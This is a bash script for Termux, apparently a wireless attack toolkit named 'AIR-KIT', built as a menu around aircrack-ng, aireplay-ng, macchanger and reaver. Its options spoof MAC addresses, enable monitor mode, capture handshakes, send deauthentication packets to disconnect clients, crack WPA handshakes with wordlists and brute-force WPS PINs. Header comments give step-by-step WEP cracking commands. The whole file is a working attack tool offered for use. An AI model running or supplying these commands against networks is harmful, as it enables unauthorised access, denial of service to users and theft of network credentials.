#!/data/data/com.termux/files/usr/bin/bash

# CODED BY: JASYON CABRILLAS SAN BUENAVENTURA
# FACEBOOK: https://web.facebook.com/mkdirlove.git
# GITHUB  : https://githib.com/mkdirlove

# Restart network interface:
# 	ifconfig <interface> down
#	ifconfig <interface> up

# Kill the baffling processes:
#	airmon-ng check kill

# Crack WEP:
#	airodump-ng --ivs -w xxx --bssid <AP BSSID> wlan0mon
#	aireplay-ng -1 0 -a <AP BSSID> wlan0mon
#	aireplay-ng -3 -b <AP BSSID> wlan0mon
#	aircrack-ng xxx.ivs

# Recovry password with your known PIN:
#	reaver -i <interface> -b <AP_MAC> -p <Your PIN> -vv


CURRENT_MAC=''

logo() 
{                                          
echo ""        
echo -e "      \e[5m\e[93m  @@@@@@   @@@  @@@@@@@              \e[25m@@@  @@@  @@@  @@@@@@@  "
echo -e "      \e[5m\e[93m @@@@@@@@  @@@  @@@@@@@@             \e[25m@@@  @@@  @@@  @@@@@@@  "
echo -e "      \e[5m\e[93m @@!  @@@  @@!  @@!  @@@             \e[25m@@!  !@@  @@!    @@!    "
echo -e "      \e[5m\e[93m !@!  @!@  !@!  !@!  @!@             \e[25m!@!  @!!  !@!    !@!    "
echo -e "      \e[5m\e[93m @!@!@!@!  !!@  @!@!!@!   \e[25m@!@!@!@!@  \e[25m@!@@!@!   !!@    @!!    "
echo -e "      \e[5m\e[93m !!!@!!!!  !!!  !!@!@!    \e[25m!!!@!@!!!  \e[25m!!@!!!    !!!    !!!    "
echo -e "      \e[5m\e[93m !!:  !!!  !!:  !!: :!!              \e[25m!!: :!!   !!:    !!:    "
echo -e "      \e[5m\e[93m :!:  !:!  :!:  :!:  !:!             \e[25m:!:  !:!  :!:    :!:    "
echo -e "      \e[5m\e[93m ::   :::   ::  ::   :::             \e[25m ::  :::   ::     ::    "
echo -e "      \e[5m\e[93m  :   : :  :     :   : :             \e[25m :   :::  :       :     "
echo -e "      \e[91m[ THIS AIR-KIT VERSION IS NOW AVAILABLE FOR TERMUX USERS ]              "
echo -e "            \e[93m[ CODED BY: \e[5mJAYSON CABRILLAS SAN BUENAVENTURA\e[25m ]              "                                                         
}

menu(){
	echo ""
	echo -e " \e[95mCONFIGURATIONS           \e[96mWPA/WPA2 ATTACKS            \e[91mWPS ATTACKS"
	echo -e "\e[93m ═════════════════════════════════════════════════════════════════════════"
	echo -e " \e[95m1) Spoof MAC Address     \e[96m5) Wireless Packet Capture  \e[91m8) PIN Attack WPS"
	echo -e " \e[95m2) Start Monitor Mode    \e[96m6) Deauth Attack            \e[91m9) Exit"
	echo -e " \e[95m3) Stop Monitor Mode     \e[96m7) Bruteforce Attack"
	echo -e " \e[95m4) Sniff Wireless Network"
	echo ""
}
clear
logo
echo ""
menu
if [ $# -eq 1 ] ; then
	if [ "$1" = '-h' ] || [ "$1" = '--help' ]; then
		menu
		exit
	elif [ "$1" ]; then
		opt="$1"
	fi
elif [ $# -eq 0 ] ; then
    echo -e "\e[93m"
	read -p "Choose attack: " opt 
fi


case $opt in
1)
	echo
	echo "[*] Spoof MAC Address"
	echo "------------------------"
	iwconfig
	echo "[*] Which interface:";read iface
	ifconfig $iface down
	echo "[*] Specify your new mac (default: random mac)"; read new_mac
	if [ "$new_mac" ] ; then
		macchanger -m $new_mac $iface
	else
		macchanger -r $iface
	fi
	ifconfig $iface up
	#Check it again
	echo 
	macchanger -s $iface
;;
2)	
	echo
	echo "[*] Start Monitor Mode"
	echo "------------------------"
	iwconfig
	echo "[*] Which interface:";read iface
	airmon-ng start $iface
;;
3)
	echo
	echo "[*] Stop Monotor Mode"
	echo "------------------------"
	airmon-ng
	echo "[*] Which interface:";read iface
	airmon-ng stop $iface
	iwconfig
;;
4)
	echo
	echo "[*] Start airodump to sniff network using wep/wpa/wpa2"
	echo "--------------------------------------------------------"
	airmon-ng
	echo "[*] Which interface:";read iface
	airodump-ng $iface
;;
5)
	echo
	echo "[*] Packet Capture"
	echo "----------------------"
	airmon-ng
	echo "[*] Which interface:";read iface
	echo "[*] Which channel:";read ch
	echo "[*] Which AP BSSID:";read bssid
	echo "[*] Safe as:       (default: $bssid-01.cap)";read filename
	if [ "$filename" ];then
		airodump-ng $iface -c $ch --bssid $bssid -w $filename
	else
		airodump-ng $iface -c $ch --bssid $bssid -w $bssid
	fi
;;	
6)
	echo
	echo "[*] Deassociation Attack (default 2 deauth packet will be send)"
	echo "-----------------------------------------------------------------"
	airmon-ng
	echo "[*] which interface";read iface
	echo "[*] Which AP BSSID:";read bssid
	while :
	do
		echo "[*] Which Client MAC address (STATION)";read c_mac
		aireplay-ng --deauth 2 -a $bssid -c $c_mac $iface
		echo "[*] Do it again? [y|n]";read op
		if [ "$op" = "n" ]; then
			break
		fi
	done
;;
7)
	echo
	echo "[*] Wordlist Attack"
	echo "---------------------"
	echo "[*] Specify you handshake packet";read hp
	echo "[*] Specify you wordlist";read wl
	aircrack-ng -w $wl $hp
;;
8)
	echo
	echo "[*] Crack WPS"
	echo "---------------"
	airmon-ng 	
	echo "[*] Which interface:";read iface
	echo "[*] Which channel:";read ch
	echo "[*] Which AP BSSID:";read bssid
	echo "[*] Set a signal strength level :  (low 1~3 high)";read level
	case $level in
	1)
		reaver -i $iface -b $bssid -S -vv -d0 -c $ch
	;;
	2)
		reaver -i $iface -b $bssid -S -vv -d2 -t 5 -c $ch
	;;
	3)
		reaver -i $iface -b $bssid -S -vv -d5 -c $ch
	;;
	*)
		echo "Invalid Setting!"
	;;
	esac
;;
*)
	echo "[-] Invalid Option!"
esac
